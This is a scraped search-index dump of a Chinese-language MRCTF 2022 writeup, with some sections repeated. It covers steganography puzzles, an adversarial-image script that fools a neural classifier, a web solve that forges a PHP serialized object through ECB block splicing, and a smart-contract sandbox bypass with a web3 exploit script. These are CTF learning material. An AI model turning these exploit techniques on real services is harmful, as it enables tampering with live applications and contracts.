\"simplenn.model\" ) # %% # Grab a reference to the first and last layer of the neural net model_input_layer = model . layers [ 0 ] . input model_output_layer = model . layers [ - 1 ] . output object_type_to_fake = 1 # Load the image to hack img = cv2 . imread ( \"dog.bmp\" ) original_image = img . astype ( np . float32 ) # Scale the image so all pixel intensities are between [-1, 1] as the model expects original_image /= 255. # Add a 4th dimension for batch size (as Keras expects) original_image = np . expand_dims ( original_image , axis = 0 ) # Pre-calculate the maximum change we will allow to the image # We\\'ll make sure our hacked image never goes past this so it doesn\\'t look funny. # A larger number produces an image faster but risks more distortion. max_change_above = original_image + ( 9.4 / 255. ) max_change_below = original_image - ( 9.4 / 255. ) # Create a copy of the input image to hack on hacked_image = np . copy ( original_image ) # How much to update the hacked image in each iteration learning_rate = 0.1 # Define the cost function. # Our \\'cost\\' will be the likelihood out image is the target class according to the pre-trained model cost_function = model_output_layer [ 0 , object_type_to_fake ] # We\\'ll ask Keras to calculate the gradient based on the input image and the currently predicted class # In this case, referring to \"model_input_layer\" will give us back image we are hacking. gradient_function = K . gradients ( cost_function , model_input_layer )[ 0 ] # Create a Keras function that we can call to calculate the current cost and gradient grab_cost_and_gradients_from_model = K . function ([ model_input_layer , K . learning_phase ()], [ cost_function , gradient_function ]) cost = 0.0 # In a loop, keep adjusting the hacked image slightly so that it tricks the model more and more # until it gets to at least 80% confidence while cost < 0.9995 : # Check how close the image is to our target class and grab the gradients we # can use to push it one more step in that direction. # Note: It\\'s really important to pass in \\'0\\' for the Keras learning mode here! # Keras layers behave differently in prediction vs. train modes! cost , gradients = grab_cost_and_gradients_from_model ([ hacked_image , 0 ]) # Move the hacked image one step further towards fooling the model hacked_image += gradients * learning_rate # Ensure that the image doesn\\'t ever change too much to either look funny or to become an invalid image hacked_image = np . clip ( hacked_image , max_change_below , max_change_above ) hacked_image = np . clip ( hacked_image , - 1.0 , 1.0 ) print ( \"Model \\' s predicted likelihood that the image is a cat: {:.8} %\" . format ( cost * 100 )) # De-scale the image\\'s pixels from [-1, 1] back to the [0, 255] range img = hacked_image [ 0 ] . copy () img *= 255. # Save the hacked image! cv2 . imwrite ( 'hacked.bmp' , img . astype ( np . uint8 )) # %% check model = load_model ( \"simplenn.model\" ) def checkMask ( model , img ): predict = model . predict ( img ) return predict [ 0 ][ 1 ] def checkSkin ( img1 , img2 ): output = [] for i in range ( 0 , len ( img1 )): for j in range ( 0 , len ( img1 [ i ])): output . append ( img2 [ i ][ j ] - img1 [ i ][ j ]) maxnum = 0 for i in output : num = 0 for j in i : if j >= 200 : j = 255 - j num = j if num >= maxnum : maxnum = num index = i print ( index ) print ( maxnum ) if maxnum > 10 : return 0 else : return 1 score = 0 img = cv2 . imread ( 'hacked.bmp' ) score += checkSkin ( img , cv2 . imread ( \"dog.bmp\" )) img = cv2 . resize ( img , ( 128 , 128 )) img_tensor = np . expand_dims ( img , axis = 0 ) img_tensor = img_tensor . astype ( np . float32 ) img_tensor /= 255. score += checkMask ( model , img_tensor ) print ( score ) flag: MRCTF{A_D0g_W1th_Br1lli4nt_Tric7} pdd \u00b6 \u65e0\u6cd5\u4f2a\u9020 ip \u8fdb\u884c\u52a9\u529b\uff0c\u56e0\u4e3a\u8fd9\u6837\u53ea\u4f1a\u8d8b\u8fd1 100 \u800c\u4e0d\u4f1a\u7b49\u4e8e \u6ce8\u610f\u5230\u9664\u88ab\u52a9\u529b\u6b21\u6570\u4ee5\u5916\u7684\u6570\u636e\u90fd\u662f\u5b58\u5728\u5ba2\u6237\u7aef\u52a0\u5bc6\u5b57\u7b26\u4e32\u4e0a\u7684\uff0c\u5c1d\u8bd5\u63a7\u5236 name \u751f\u6210\u51fa\u76ee\u6807 enc \u5373\u53ef\uff08\u53ef\u5728 debug \u4e0a\u770b\u5230\u89e3\u5bc6\u7ed3\u679c\uff09 \u7b80\u5355\u5c1d\u8bd5\u53ef\u77e5\u52a0\u5bc6\u662f\u5e26 pad \u7684\u6bcf 16 \u5b57\u8282\u8fdb\u884c ECB \u52a0\u5bc6\u7684\u672a\u77e5\u52a0\u5bc6\u3002\uff08\u7c7b\u4f3c AES-256-ECB\uff09 let enc1 = await fetch ( \"https://ppd.node3.mrctf.fun/lucky.php?action=start\" , { \"headers\" : { \"content-type\" : \"application/json\" }, \"body\" : JSON . stringify ({ username : 'user_tpHRGt11111111111111' }), \"method\" : \"POST\" }). then ( x => x . json ()). then ( x => x . enc ); let enc2 = await fetch ( \"https://ppd.node3.mrctf.fun/lucky.php?action=start\" , { \"headers\" : { \"content-type\" : \"application/json\" }, \"body\" : JSON . stringify ({ username : '111111111111' + 'O:4:\"User\":3:{s:8:\"username\";s:22:\"user_tpHRGt11111111111\";s:5:\"times\";i:110;s:5:\"money\";d:100;}' }), \"method\" : \"POST\" }). then ( x => x . json ()). then ( x => x . enc ); fetch ( \"https://ppd.node3.mrctf.fun/lucky.php?action=getFlag\" , { \"headers\" : { \"content-type\" : \"application/json\" }, \"body\" : JSON . stringify ({ enc : btoa ( atob ( enc2 ). slice ( 48 ). slice ( 0 , target . length ) + atob ( enc1 ). slice ( - 16 ))}), \"method\" : \"POST\" }). then ( x => x . json ()). then ( x => { console . log ( x . flag ); }) flag: MRCTF{Xi_Xi0ngDi_9_Na_Kan_w0!} SandSandSand \u00b6 \u9898\u76ee\u5408\u7ea6 pragma solidity 0.7.0 ; contract checktheCode { function checks ( address a ) public { uint256 size ; assembly { size : = extcodesize ( a ) } require ( size < 0x10 ); } } contract BabySandbox { event SendFlag ( address ); checktheCode public A ; constructor () public { A = new checktheCode (); } function run ( address code ) external payable { bool success ; bytes memory result ; ( success , result ) = address ( A ). call ( abi . encodeWithSignature ( \"checks(address)\" , code ) ); require ( success == true ); assembly { if eq ( caller (), address ()) { switch delegatecall ( gas (), code , 0x00 , 0x00 , 0x00 , 0x00 ) case 0 { returndatacopy ( 0x00 , 0x00 , returndatasize ()) revert ( 0x00 , returndatasize ()) } case 1 { returndatacopy ( 0x00 , 0x00 , returndatasize ()) return ( 0x00 , returndatasize ()) } } if lt ( gas (), 0xB000 ) { revert ( 0x00 , 0x00 ) } calldatacopy ( 0x00 , 0x00 , calldatasize ()) if eq ( staticcall ( 0x5000 , address (), 0 , calldatasize (), 0 , 0 ), 1 ) { revert ( 0x00 , 0x00 ) } if eq ( call ( 0x5000 , address (), 0 , 0 , calldatasize (), 0 , 0 ), 0 ) { revert ( 0x00 , 0x00 ) } } emit SendFlag ( msg.sender ); } } \u7b80\u5355\u5206\u6790\u4e00\u4e0b\u5c31\u662f\u8981\u7528 0x5000 \u7684 gas \u8c03\u7528\u4e00\u4e2a\u81ea\u5b9a\u4e49\u5408\u7ea6\uff0c\u8981\u6c42 staticcall \u8c03\u7528\u4f1a\u5931\u8d25\uff0ccall \u4f1a\u6210\u529f\uff0c\u5e76\u4e14\u5408\u7ea6\u5b57\u8282\u7801\u5728 0x10 \u4ee5\u5185 \u76f4\u63a5\u5728\u5408\u7ea6\u4e2d\u6267\u884c\u4e00\u6b21 sstore \u5c31\u53ef\u4ee5\u8ba9 staticcall \u6302\u6389\uff0cyul \u5408\u7ea6\uff1a object \"DeleCaller\" { code { sstore ( 0 , 0 ) datacopy ( 0 , dataoffset ( \"Runtime\" ), datasize ( \"Runtime\" )) return ( 0 , datasize ( \"Runtime\" )) } object \"Runtime\" { code { sstore ( 0 , 0 ) stop () } } } \u6216\u8005\u624b\u5199\u6c47\u7f16\uff1a ; \u524d\u9762\u5957\u4e00\u5c42 creationCode PUSH1 0x00 ; 6000 PUSH1 0x00 ; 6000 SSTORE ; 55 STOP ; 00 exp from web3 import Web3 w3 = Web3 ( Web3 . HTTPProvider ( 'http://retr0.vip:8545' )) hacker = '...' target = '...' privateKey = '...' def get_txn ( src , dst , data , value = 0 , gas = 0x200000 ): return { \"chainId\" : 0x4bb , \"from\" : src , \"to\" : dst , \"gasPrice\" : w3 . toWei ( 1.1 , 'gwei' ), \"gas\" : gas , \"value\" : w3 . toWei ( value , 'ether' ), \"nonce\" : w3 . eth . getTransactionCount ( src ), \"data\" : data } data = get_txn ( hacker , None , bytes . fromhex ( \"60006000556006601160003960066000f3600060005500\" )) transaction = w3 . eth . account . signTransaction ( data , privateKey ) . rawTransaction txn_hash = w3 . eth . sendRawTransaction ( transaction ) . hex () txn_receipt = w3 . eth . waitForTransactionReceipt ( txn_hash ) print ( txn_receipt ) contractAddress = txn_receipt [ 'contractAddress' ] data = get_txn ( hacker , target , bytes . fromhex ( \"522bb704000000000000000000000000\" + contractAddress [ 2 :])) transaction = w3 . eth . account . signTransaction ( data , privateKey ) . rawTransaction txn_hash = w3 . eth . sendRawTransaction ( transaction ) . hex () txn_receipt = w3 . eth . waitForTransactionReceipt ( txn_hash ) print ( txn_receipt ) flag: MRCTF{TheShor7testShel1c0dE&EIP-2929} JOP_Gadget \u00b6 \u9898\u76ee\u7684\u610f\u601d\u5c31\u662f\u4f1a\u5148\u628a\u8f93\u5165 PUSH2 \u8fdb\u53bb\uff0c\u7136\u540e\u6267\u884c\uff0c\u5f00\u5934\u4f1a\u5148 JUMP \u770b\u5230\u51fa\u9898\u4eba\u7ed9\u7684\u6570\u636e\u89e3\u6790\u53ef\u4ee5\u53d1\u73b0\u6ca1\u6709\u68c0\u67e5\u957f\u5ea6 \u6240\u4ee5\u5982\u679c\u8f93\u5165\u7684\u957f\u5ea6\u5e76\u4e0d\u662f uint16\uff0c\u90a3\u4e48\u540e\u9762\u7684\u5c31\u4f1a\u88ab\u5f53\u6210\u6b63\u5e38\u7684\u5b57\u8282\u7801\u6765\u8fd0\u884c\uff0c\u6240\u4ee5\u53ea\u9700\u8981\u5728\u4e00\u4e2a 16 \u4f4d padding \u540e\u9762\u63a5\u4e0a\u6b63\u5e38\u8fd4\u56de 1 \u7684\u5b57\u8282\u7801\u5c31\u53ef\u4ee5\u5728\u8fd0\u884c\u7684\u65f6\u5019\u76f4\u63a5\u8fd4\u56de 1 \u4f8b\u5982 0x123450600160805260206080f300 \u4e5f\u5c31\u53d8\u6210\u4e86\uff1a PUSH2 1234 POP PUSH1 0x01 PUSH1 0x80 MSTORE PUSH1 0x20 PUSH1 0x80 RETURN STOP flag: MRCTF{You_4r3_7hE_master_0f_F1nD1ng_G4g3t_0r_t73_K1ng_07_the_vuln_guesser&F0under} Bleach! \u00b6 \u8d5b\u540e\u8865\u505a\u7684\u9898 \u6d41\u91cf\u5206\u6790\u770b\u5230\u4e00\u5806 UDP \u534f\u8bae\u548c OICQ \u534f\u8bae \u5728\u8d5b\u540e\u770b\u4e86 nano \u7684 wp \u540e\u77e5\u9053\u90a3\u4e00\u5927\u5806 UDP \u662f\u5728 UDP \u57fa\u7840\u4e0a\u7684 RTP \u534f\u8bae\uff0c\u8981\u5728 wireshark \u91cc decode as RTP \u624d\u80fd\u663e\u793a\u4e3a RTP \u6d41 \u7136\u540e\u901a\u8fc7 wireshark \u7684 RTP \u6d41\u64ad\u653e\u5668\u5bfc\u51fa\u97f3\u9891 raw \u6587\u4ef6\uff0c\u5728 Au \u4e2d\u6253\u5f00\uff0c\u6839\u636e\u9898\u76ee\u63cf\u8ff0\u7684\u63d0\u793a\uff0c\u5e94\u8be5\u662f 44100Hz\u300116 \u4f4d PCM \u7f16\u7801\uff0c\u6253\u5f00\u540e\u53ef\u4ee5\u542c\u5230\u6e05\u6670\u6b4c\u66f2\u58f0\u97f3 \u518d\u7531\u9898\u76ee\u63cf\u8ff0\u4e2d\u7684 picture in music \u60f3\u5230 lsb\uff0c\u4ee5\u53ca 400*400 \u7684\u56fe\u7247\u5927\u5c0f\u3002\u6240\u4ee5\u5b58\u4e3a wav \u540e\u8bfb\u53d6\uff0c\u63d0\u53d6 lsb \u8f6c\u4e3a\u56fe\u7247 \u56e0\u4e3a\u5b58\u4e0b\u6765\u7684 wav \u662f 16 \u4f4d\u6574\u6570\uff0c\u6240\u4ee5\u6bcf\u4e00\u5e27\u89c6\u4e3a\u4e24\u4e2a 8 \u4f4d\u6574\u6570\uff0c\u5206\u522b\u63d0\u53d6 lsb\uff0c\u4e00\u5171\u9700\u8981 400*400/2 \u5e27\uff1a exp import wave from PIL import Image f = wave . open ( \"bleach.wav\" , \"rb\" ) frames = f . readframes ( 400 * 400 // 2 ) res = [ 255 if frame & 1 else 0 for frame in frames ] img = Image . new ( \"L\" , ( 400 , 400 )) k = 0 for i in range ( 400 ): for j in range ( 400 ): img . putpixel (( j , i ), res [ k ]) k += 1 img . show () img . save ( \"flag.png\" ) flag: MRCTF{Don\u2019t_Use_Your_tools!}","title":"MRCTF 2022"},{"location":"writeups/mrctf2022/#mrctf-2022-writeup","text":"Abstract \u53d7\u9ad8\u4e2d\u5b66\u957f\u9080\u8bf7\u6765\u6253\u7684\u6bd4\u8d5b\uff0c\u9898\u76ee\u8d28\u91cf\u5f88\u9ad8\uff0c\u6253\u7684\u5f88\u723d\uff0c\u961f\u91cc\u5927\u624b\u5b50\u5f3a\u7684\u5f88\uff0c\u5e26\u7740\u62ff\u4e86\u7b2c\u4e00 misc \u6709\u4e00\u9053\u9898\u6ca1\u505a\u51fa\u6765\uff0c\u770b\u4e86 nano \u7684 wp \u540e\u8865\u51fa\u6765\u4e86\uff0c\u8fd9\u6b21\u6bd4\u8d5b\u4e5f\u53c2\u4e0e\u4e86\u4e00\u4e0b eth \u9898\u76ee","title":"MRCTF 2022 Writeup"},{"location":"writeups/mrctf2022/#readlongnovel","text":"\u7531\u4e8e\u65f6\u95f4\u591f\u957f\u3001\u9898\u5e93\u4e0d\u5927\uff0c\u6240\u4ee5\u76f4\u63a5\u7f51\u7edc\u641c\u7d22 + \u539f\u6587 txt \u641c\u7d22\u5c31\u53ef\u4ee5\u624b\u52a8\u641e\u5dee\u4e0d\u591a flag: MRCTF{\u613f\u60a8\u7684+\u6587\u660e+\u6c38\u8fdc\u8fdb\u6b65}","title":"ReadLongNovel"},{"location":"writeups/mrctf2022/#connecting","text":"obj \u6709\u4e2a\u6570\u636e\u4e0d\u6539\u7684\u8bdd blender \u52a0\u8f7d\u4e0d\u51fa\u6765\uff084d33 \u4e0d\u662f\u5341\u8fdb\u5236\u6570\uff09 \u7136\u540e\u53d1\u73b0\u6240\u6709 f \u90fd\u662f / \u5206\u9694\u7684\u4e09\u4e2a\u6570\u76f8\u540c\uff0c\u53ea\u6709\u8fd9\u4e00\u884c\u4e0d\u76f8\u540c >>> for each in [ 0x4d , 0x33 , 0x52 , 0x37 , 0x61 , 0x49 , 0x63 , 0x54 , 0x46 ]: ... print ( chr ( each ), end = \"\" ) ... M3R7aIcTF \u56fe\u7247\u5f00\u5934 xml \u4fe1\u606f\u4e2d\u53d1\u73b0\uff1aThank Fabien Petitcolas For his work. \u641c\u5230 mp3stego\uff0c\u7528\u5b83\u548c\u5bc6\u7801 M3R7aIcTF \u6765\u89e3\u5bc6 wav \u6587\u4ef6\uff08\u5176\u5b9e\u662f mp3\uff09\u5f97\u5230\uff1a FBGTGURXMFEWGVCGFEWSAKZAFVGVEQ2UIZ5VOSKGJFPTEMBSGJPWG33ONZSWG5C7ON2WGY3FONZWM5LMNR4SC7I base32\uff1a (M3R7aIcTF)- + -MRCTF{WIFI_2022_connect_successfully!} flag: MRCTF{WIFI_2022_connect_successfully!}","title":"Connecting..."},{"location":"writeups/mrctf2022/#pixel","text":"blue plane \u770b\u8d77\u6765\u5f88\u6709\u95ee\u9898\uff0c\u628a 512 \u5f20\u56fe\u7247\u7684\u6240\u6709\u70b9\u70b9\u53e0\u52a0\uff08blue \u5404\u4e2a plane \u90fd\u5dee\u4e0d\u591a\uff0c\u8fd9\u4e2a\u662f blue 3\uff09 \u518d\u6839\u636e hint \u76f4\u63a5\u641e\u5230\u539f\u56fe\uff1a img2 = Image . new ( \"RGB\" , ( 512 , 512 )) for i in range ( 512 ): for j in range ( 512 ): img2 . putpixel (( i , j ), ( 255 , 255 , 255 )) for n in tqdm ( range ( 512 )): img = Image . open ( f \"pixel/ { n } .png\" ) width , height = img . size for i in range ( width ): for j in range ( height ): R , G , B = pix = img . getpixel (( i , j )) if B != 255 : img2 . putpixel (( i , j ), pix ) img2 . save ( f \"zigzag.png\" ) red plane 0 \u6709\u95ee\u9898 \u6839\u636e zigzag \u63a8\u6d4b\u9700\u8981\u8fdb\u884c\u4e00\u4e9b zigzag \u64cd\u4f5c\uff08\u5373\u50cf\u7d20\u70b9\u987a\u5e8f\u7684\u8f6c\u6362\uff09\u7f51\u4e0a\u627e\u627e\u4ee3\u7801\u6539\u4e00\u6539 zigzag from PIL import Image import numpy as np def zigzag ( data ): row = data . shape [ 0 ] col = data . shape [ 1 ] num = row * col lst = np . zeros ( num ,) k = 0 i = 0 j = 0 while i < row and j < col and k < num : lst [ k ] = data . item ( i , j ) k = k + 1 if ( i + j ) % 2 == 0 : if ( i - 1 ) in range ( row ) and ( j + 1 ) not in range ( col ): i = i + 1 elif ( i - 1 ) not in range ( row ) and ( j + 1 ) in range ( col ): j = j + 1 elif ( i - 1 ) not in range ( row ) and ( j + 1 ) not in range ( col ): i = i + 1 else : i = i - 1 j = j + 1 elif ( i + j ) % 2 == 1 : if ( i + 1 ) in range ( row ) and ( j - 1 ) not in range ( col ): i = i + 1 elif ( i + 1 ) not in range ( row ) and ( j - 1 ) in range ( col ): j = j + 1 elif ( i + 1 ) not in range ( row ) and ( j - 1 ) not in range ( col ): j = j + 1 else : i = i + 1 j = j - 1 return lst def dezigzag ( data ): num = len ( data ) row = int ( num ** 0.5 ) col = int ( num ** 0.5 ) lst = np . zeros (( row , col )) k = 0 i = 0 j = 0 while i < row and j < col and k < num : lst [ i ][ j ] = data [ k ] k = k + 1 if ( i + j ) % 2 == 0 : if ( i - 1 ) in range ( row ) and ( j + 1 ) not in range ( col ): i = i + 1 elif ( i - 1 ) not in range ( row ) and ( j + 1 ) in range ( col ): j = j + 1 elif ( i - 1 ) not in range ( row ) and ( j + 1 ) not in range ( col ): i = i + 1 else : i = i - 1 j = j + 1 elif ( i + j ) % 2 == 1 : if ( i + 1 ) in range ( row ) and ( j - 1 ) not in range ( col ): i = i + 1 elif ( i + 1 ) not in range ( row ) and ( j - 1 ) in range ( col ): j = j + 1 elif ( i + 1 ) not in range ( row ) and ( j - 1 ) not in range ( col ): j = j + 1 else : i = i + 1 j = j - 1 return lst def ZigZag ( data ): lst = zigzag ( data ) k = 0 ret = np . zeros ( data . shape ) row , col = data . shape for i in range ( row ): for j in range ( col ): ret [ i ][ j ] = lst [ k ] k += 1 return ret def deZigZag ( data ): lst = [] row , col = data . shape for i in range ( row ): for j in range ( col ): lst . append ( data [ i ][ j ]) ret = dezigzag ( lst ) return ret img = Image . open ( \"XXX\" ) . convert ( \"L\" ) arr = np . array ( img ) #for i in range(64): #for j in range(64): # arr[8*i:8*i+8, 8*j:8*j+8] = ZigZag(arr[8*i:8*i+8, 8*j:8*j+8]) #arr[8*i:8*i+8, 8*j:8*j+8] = deZigZag(arr[8*i:8*i+8, 8*j:8*j+8]) arr [ 0 : 512 , 0 : 512 ] = deZigZag ( arr [ 0 : 512 , 0 : 512 ]) img2 = Image . fromarray ( arr , \"L\" ) img2 . show () img2 . save ( \"XXX\" ) \u660e\u663e\u662f\u732b\u56fe\u7b97\u6cd5\uff0c\u53c2\u6570 20 22 cat map import os from PIL.Image import open as load_pic , new as new_pic def main ( path , iterations , keep_all = False , name = XXX ): title = os . path . splitext ( os . path . split ( path )[ 1 ])[ 0 ] ppath = path counter = 0 while counter < iterations : with load_pic ( path ) as image : dim = width , height = image . size with new_pic ( image . mode , dim ) as canvas : for x in range ( width ): for y in range ( height ): nx = ( 441 * x + 20 * y ) % width ny = ( 22 * x + 1 * y ) % height canvas . putpixel (( nx , height - ny - 1 ), image . getpixel (( x , height - y - 1 ))) if counter > 0 and not keep_all : os . remove ( path ) counter += 1 print ( counter , end = \" \\r \" ) path = name . format ( name = title , index = counter ) canvas . save ( path ) return canvas result = main ( XXX , 512 , True ) result . show () flag: MRCTF{f8e49887132bf8977a161472781b718c}","title":"Pixel"},{"location":"writeups/mrctf2022/#spy_dog","text":"\u8981\u6c4299.9%\u7684\u6982\u7387\u8bc6\u522b\u6210\u732b\u3002 \u7528\u68af\u5ea6\u53cd\u5411\u4f20\u64ad\u8bad\u7ec3\u7f51\u7edc\u53c2\u6570\u7684\u65b9\u5f0f\u8bad\u7ec3\u56fe\u7247\u5373\u53ef\uff0c\u4ee3\u7801\u76f4\u63a5\u6284\u7f51\u4e0a\u7684\uff1a https://www.likecs.com/show-915984.html \u7531\u4e8e\u53d6\u6574\u5e26\u6765\u7684\u95ee\u9898\uff0c\u8bad\u7ec3\u5f97\u5230\u7684\u51c6\u786e\u7387\u8981\u6bd4\u8981\u6c42\u9ad8\u4e00\u70b9 exp # %% from keras.models import load_model import cv2 import numpy as np from keras.preprocessing import image from keras.applications import inception_v3 from keras import backend as K from PIL import Image import tensorflow as tf tf . compat . v1 . disable_eager_execution () # %% model = load_model ( \"simplenn.model\" ) # %% # Grab a reference to the first and last layer of the neural net model_input_layer = model . layers [ 0 ] . input model_output_layer = model . layers [ - 1 ] . output object_type_to_fake = 1 # Load the image to hack img = cv2 . imread ( \"dog.bmp\" ) original_image = img . astype ( np . float32 ) # Scale the image so all pixel intensities are between [-1, 1] as the model expects original_image /= 255. # Add a 4th dimension for batch size (as Keras expects) original_image = np . expand_dims ( original_image , axis = 0 ) # Pre-calculate the maximum change we will allow to the image # We\\'ll make sure our hacked image never goes past this so it doesn\\'t look funny. # A larger number produces an image faster but risks more distortion. max_change_above = original_image + ( 9.4 / 255. ) max_change_below = original_image - ( 9.4 / 255. ) # Create a copy of the input image to hack on hacked_image = np . copy ( original_image ) # How much to update the hacked image in each iteration learning_rate = 0.1 # Define the cost function. # Our \\'cost\\' will be the likelihood out image is the target class according to the pre-trained model cost_function = model_output_layer [ 0 , object_type_to_fake ] # We\\'ll ask Keras to calculate the gradient based on the input image and the currently predicted class # In this case, referring to \"model_input_layer\" will give us back image we are hacking. gradient_function = K . gradients ( cost_function , model_input_layer )[ 0 ] # Create a Keras function that we can call to calculate the current cost and gradient grab_cost_and_gradients_from_model = K . function ([ model_input_layer , K . learning_phase ()], [ cost_function , gradient_function ]) cost = 0.0 # In a loop, keep adjusting the hacked image slightly so that it tricks the model more and more # until it gets to at least 80% confidence while cost < 0.9995 : # Check how close the image is to our target class and grab the gradients we # can use to push it one more step in that direction. # Note: It\\'s really important to pass in \\'0\\' for the Keras learning mode here! # Keras layers behave differently in prediction vs. train modes! cost , gradients = grab_cost_and_gradients_from_model ([ hacked_image , 0 ]) # Move the hacked image one step further towards fooling the model hacked_image += gradients * learning_rate # Ensure that the image doesn\\'t ever change too much to either look funny or to become an invalid image hacked_image = np . clip ( hacked_image , max_change_below , max_change_above ) hacked_image = np . clip ( hacked_image , - 1.0 , 1.0 ) print ( \"Model \\' s predicted likelihood that the image is a cat: {:.8} %\" . format ( cost * 100 )) # De-scale the image\\'s pixels from [-1, 1] back to the [0, 255] range img = hacked_image [ 0 ] . copy () img *= 255. # Save the hacked image! cv2 . imwrite ( 'hacked.bmp' , img . astype ( np . uint8 )) # %% check model = load_model ( \"simplenn.model\" ) def checkMask ( model , img ): predict = model . predict ( img ) return predict [ 0 ][ 1 ] def checkSkin ( img1 , img2 ): output = [] for i in range ( 0 , len ( img1 )): for j in range ( 0 , len ( img1 [ i ])): output . append ( img2 [ i ][ j ] - img1 [ i ][ j ]) maxnum = 0 for i in output : num = 0 for j in i : if j >= 200 : j = 255 - j num = j if num >= maxnum : maxnum = num index = i print ( index ) print ( maxnum ) if maxnum > 10 : return 0 else : return 1 score = 0 img = cv2 . imread ( 'hacked.bmp' ) score += checkSkin ( img , cv2 . imread ( \"dog.bmp\" )) img = cv2 . resize ( img , ( 128 , 128 )) img_tensor = np . expand_dims ( img , axis = 0 ) img_tensor = img_tensor . astype ( np . float32 ) img_tensor /= 255. score += checkMask ( model , img_tensor ) print ( score ) flag: MRCTF{A_D0g_W1th_Br1lli4nt_Tric7}","title":"Spy_Dog"},{"location":"writeups/mrctf2022/#pdd","text":"\u65e0\u6cd5\u4f2a\u9020 ip \u8fdb\u884c\u52a9\u529b\uff0c\u56e0\u4e3a\u8fd9\u6837\u53ea\u4f1a\u8d8b\u8fd1 100 \u800c\u4e0d\u4f1a\u7b49\u4e8e \u6ce8\u610f\u5230\u9664\u88ab\u52a9\u529b\u6b21\u6570\u4ee5\u5916\u7684\u6570\u636e\u90fd\u662f\u5b58\u5728\u5ba2\u6237\u7aef\u52a0\u5bc6\u5b57\u7b26\u4e32\u4e0a\u7684\uff0c\u5c1d\u8bd5\u63a7\u5236 name \u751f\u6210\u51fa\u76ee\u6807 enc \u5373\u53ef\uff08\u53ef\u5728 debug \u4e0a\u770b\u5230\u89e3\u5bc6\u7ed3\u679c\uff09 \u7b80\u5355\u5c1d\u8bd5\u53ef\u77e5\u52a0\u5bc6\u662f\u5e26 pad \u7684\u6bcf 16 \u5b57\u8282\u8fdb\u884c ECB \u52a0\u5bc6\u7684\u672a\u77e5\u52a0\u5bc6\u3002\uff08\u7c7b\u4f3c AES-256-ECB\uff09 let enc1 = await fetch ( \"https://ppd.node3.mrctf.fun/lucky.php?action=start\" , { \"headers\" : { \"content-type\" : \"application/json\" }, \"body\" : JSON . stringify ({ username : 'user_tpHRGt11111111111111' }), \"method\" : \"POST\" }). then ( x => x . json ()). then ( x => x . enc ); let enc2 = await fetch ( \"https://ppd.node3.mrctf.fun/lucky.php?action=start\" , { \"headers\" : { \"content-type\" : \"application/json\" }, \"body\" : JSON . stringify ({ username : '111111111111' + 'O:4:\"User\":3:{s:8:\"username\";s:22:\"user_tpHRGt11111111111\";s:5:\"times\";i:110;s:5:\"money\";d:100;}' }), \"method\" : \"POST\" }). then ( x => x . json ()). then ( x => x . enc ); fetch ( \"https://ppd.node3.mrctf.fun/lucky.php?action=getFlag\" , { \"headers\" : { \"content-type\" : \"application/json\" }, \"body\" : JSON . stringify ({ enc : btoa ( atob ( enc2 ). slice ( 48 ). slice ( 0 , target . length ) + atob ( enc1 ). slice ( - 16 ))}), \"method\" : \"POST\" }). then ( x => x . json ()). then ( x => { console . log ( x . flag ); }) flag: MRCTF{Xi_Xi0ngDi_9_Na_Kan_w0!}","title":"pdd"},{"location":"writeups/mrctf2022/#sandsandsand","text":"\u9898\u76ee\u5408\u7ea6 pragma solidity 0.7.0 ; contract checktheCode { function checks ( address a ) public { uint256 size ; assembly { size : = extcodesize ( a ) } require ( size < 0x10 ); } } contract BabySandbox { event SendFlag ( address ); checktheCode public A ; constructor () public { A = new checktheCode (); } function run ( address code ) external payable { bool success ; bytes memory result ; ( success , result ) = address ( A ). call ( abi . encodeWithSignature ( \"checks(address)\" , code ) ); require ( success == true ); assembly { if eq ( caller (), address ()) { switch delegatecall ( gas (), code , 0x00 , 0x00 , 0x00 , 0x00 ) case 0 { returndatacopy ( 0x00 , 0x00 , returndatasize ()) revert ( 0x00 , returndatasize ()) } case 1 { returndatacopy ( 0x00 , 0x00 , returndatasize ()) return ( 0x00 , returndatasize ()) } } if lt ( gas (), 0xB000 ) { revert ( 0x00 , 0x00 ) } calldatacopy ( 0x00 , 0x00 , calldatasize ()) if eq ( staticcall ( 0x5000 , address (), 0 , calldatasize (), 0 , 0 ), 1 ) { revert ( 0x00 , 0x00 ) } if eq ( call ( 0x5000 , address (), 0 , 0 , calldatasize (), 0 , 0 ), 0 ) { revert ( 0x00 , 0x00 ) } } emit SendFlag ( msg.sender ); } } \u7b80\u5355\u5206\u6790\u4e00\u4e0b\u5c31\u662f\u8981\u7528 0x5000 \u7684 gas \u8c03\u7528\u4e00\u4e2a\u81ea\u5b9a\u4e49\u5408\u7ea6\uff0c\u8981\u6c42 staticcall \u8c03\u7528\u4f1a\u5931\u8d25\uff0ccall \u4f1a\u6210\u529f\uff0c\u5e76\u4e14\u5408\u7ea6\u5b57\u8282\u7801\u5728 0x10 \u4ee5\u5185 \u76f4\u63a5\u5728\u5408\u7ea6\u4e2d\u6267\u884c\u4e00\u6b21 sstore \u5c31\u53ef\u4ee5\u8ba9 staticcall \u6302\u6389\uff0cyul \u5408\u7ea6\uff1a object \"DeleCaller\" { code { sstore ( 0 , 0 ) datacopy ( 0 , dataoffset ( \"Runtime\" ), datasize ( \"Runtime\" )) return ( 0 , datasize ( \"Runtime\" )) } object \"Runtime\" { code { sstore ( 0 , 0 ) stop () } } } \u6216\u8005\u624b\u5199\u6c47\u7f16\uff1a ; \u524d\u9762\u5957\u4e00\u5c42 creationCode PUSH1 0x00 ; 6000 PUSH1 0x00 ; 6000 SSTORE ; 55 STOP ; 00 exp from web3 import Web3 w3 = Web3 ( Web3 . HTTPProvider ( 'http://retr0.vip:8545' )) hacker = '...' target = '...' privateKey = '...' def get_txn ( src , dst , data , value = 0 , gas = 0x200000 ): return { \"chainId\" : 0x4bb , \"from\" : src , \"to\" : dst , \"gasPrice\" : w3 . toWei ( 1.1 , 'gwei' ), \"gas\" : gas , \"value\" : w3 . toWei ( value , 'ether' ), \"nonce\" : w3 . eth . getTransactionCount ( src ), \"data\" : data } data = get_txn ( hacker , None , bytes . fromhex ( \"60006000556006601160003960066000f3600060005500\" )) transaction = w3 . eth . account . signTransaction ( data , privateKey ) . rawTransaction txn_hash = w3 . eth . sendRawTransaction ( transaction ) . hex () txn_receipt = w3 . eth . waitForTransactionReceipt ( txn_hash ) print ( txn_receipt ) contractAddress = txn_receipt [ 'contractAddress' ] data = get_txn ( hacker , target , bytes . fromhex ( \"522bb704000000000000000000000000\" + contractAddress [ 2 :])) transaction = w3 . eth . account . signTransaction ( data , privateKey ) . rawTransaction txn_hash = w3 . eth . sendRawTransaction ( transaction ) . hex () txn_receipt = w3 . eth . 